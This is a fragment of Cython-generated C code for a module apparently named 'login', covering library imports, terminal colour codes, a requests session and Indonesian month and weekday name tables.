  __pyx_t_1 = __Pyx_Import(__pyx_n_s_platform, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_platform); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_platform, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Panel);
  __Pyx_GIVEREF(__pyx_n_s_Panel);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Panel);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_rich_panel, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Panel); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Panel, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Tree);
  __Pyx_GIVEREF(__pyx_n_s_Tree);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Tree);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_rich_tree, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Tree); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_garis, __pyx_t_2) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_print);
  __Pyx_GIVEREF(__pyx_n_s_print);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_print);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_rich, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_print); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_prints, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_dump);
  __Pyx_GIVEREF(__pyx_n_s_dump);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_dump);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_src, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_dump); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Dump, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_menu);
  __Pyx_GIVEREF(__pyx_n_s_menu);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_menu);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_src, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Menu, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_menulain);
  __Pyx_GIVEREF(__pyx_n_s_menulain);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_menulain);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_src, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_menulain); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_MenuLain, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_apikey);
  __Pyx_GIVEREF(__pyx_n_s_apikey);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_apikey);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_src, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_apikey); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ApiKey, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_P, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 14, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_91m) < 0) __PYX_ERR(0, 15, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_H, __pyx_kp_u_1_92m) < 0) __PYX_ERR(0, 16, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_K, __pyx_kp_u_1_93m) < 0) __PYX_ERR(0, 17, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_1_94m) < 0) __PYX_ERR(0, 18, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_95m) < 0) __PYX_ERR(0, 19, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O, __pyx_kp_u_1_96m) < 0) __PYX_ERR(0, 20, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_N, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 21, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_platform); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_device, __pyx_t_1) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date_format, __pyx_kp_u_d_m_Y) < 0) __PYX_ERR(0, 23, __pyx_L1_error)

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_freetoken, __pyx_t_1) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_Session); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ses, __pyx_t_1) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_now); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ct, __pyx_t_1) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ct); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_month); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_n, __pyx_t_2) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_u_Januari);
  __Pyx_GIVEREF(__pyx_n_u_Januari);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_Januari);
  __Pyx_INCREF(__pyx_n_u_Februari);
  __Pyx_GIVEREF(__pyx_n_u_Februari);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_n_u_Februari);
  __Pyx_INCREF(__pyx_n_u_Maret);
  __Pyx_GIVEREF(__pyx_n_u_Maret);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_n_u_Maret);
  __Pyx_INCREF(__pyx_n_u_April);
  __Pyx_GIVEREF(__pyx_n_u_April);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_n_u_April);
  __Pyx_INCREF(__pyx_n_u_Mei);
  __Pyx_GIVEREF(__pyx_n_u_Mei);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_n_u_Mei);
  __Pyx_INCREF(__pyx_n_u_Juni);
  __Pyx_GIVEREF(__pyx_n_u_Juni);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_n_u_Juni);
  __Pyx_INCREF(__pyx_n_u_Juli);
  __Pyx_GIVEREF(__pyx_n_u_Juli);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_n_u_Juli);
  __Pyx_INCREF(__pyx_n_u_Agustus);
  __Pyx_GIVEREF(__pyx_n_u_Agustus);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_n_u_Agustus);
  __Pyx_INCREF(__pyx_n_u_September);
  __Pyx_GIVEREF(__pyx_n_u_September);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_n_u_September);
  __Pyx_INCREF(__pyx_n_u_Oktober);
  __Pyx_GIVEREF(__pyx_n_u_Oktober);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_n_u_Oktober);
  __Pyx_INCREF(__pyx_n_u_November);
  __Pyx_GIVEREF(__pyx_n_u_November);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_n_u_November);
  __Pyx_INCREF(__pyx_n_u_Desember);
  __Pyx_GIVEREF(__pyx_n_u_Desember);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_n_u_Desember);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan, __pyx_t_2) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
     {

      
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_n); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_1 = PyObject_RichCompare(__pyx_t_2, __pyx_int_0, Py_LT); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 30, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (!__pyx_t_7) {
      } else {
        __pyx_t_6 = __pyx_t_7;
        goto __pyx_L9_bool_binop_done;
      }
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_n); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = PyObject_RichCompare(__pyx_t_1, __pyx_int_12, Py_GT); __Pyx_XGOTREF(__pyx_t_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 30, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_6 = __pyx_t_7;
      __pyx_L9_bool_binop_done:;
      if (__pyx_t_6) {

        
        __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L2_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
      }

      
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_n); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_1 = __Pyx_PyInt_SubtractObjC(__pyx_t_2, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_nTemp, __pyx_t_1) < 0) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L7_try_end;
    __pyx_L2_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_8) {
      __Pyx_AddTraceback("login", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_9) < 0) __PYX_ERR(0, 33, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 33, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      goto __pyx_L3_exception_handled;
    }
    goto __pyx_L4_except_error;
    __pyx_L4_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L3_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L7_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_datetime); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_now); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_current, __pyx_t_9) < 0) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_current); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_year); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ta, __pyx_t_2) < 0) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_current); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_month); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bu, __pyx_t_9) < 0) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_current); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_day); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ha, __pyx_t_2) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_bulan); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_nTemp); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_1 = __Pyx_PyObject_GetItem(__pyx_t_2, __pyx_t_9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_op, __pyx_t_1) < 0) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_date); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_today); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_my_date, __pyx_t_1) < 0) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_calendar); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_day_name); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_my_date); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_weekday); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetItem(__pyx_t_9, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hr, __pyx_t_2) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Sunday, __pyx_n_u_Minggu) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Monday, __pyx_n_u_Senin) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Tuesday, __pyx_n_u_Selasa) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Wednesday, __pyx_n_u_Rabu) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Thursday, __pyx_n_u_Kamis) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
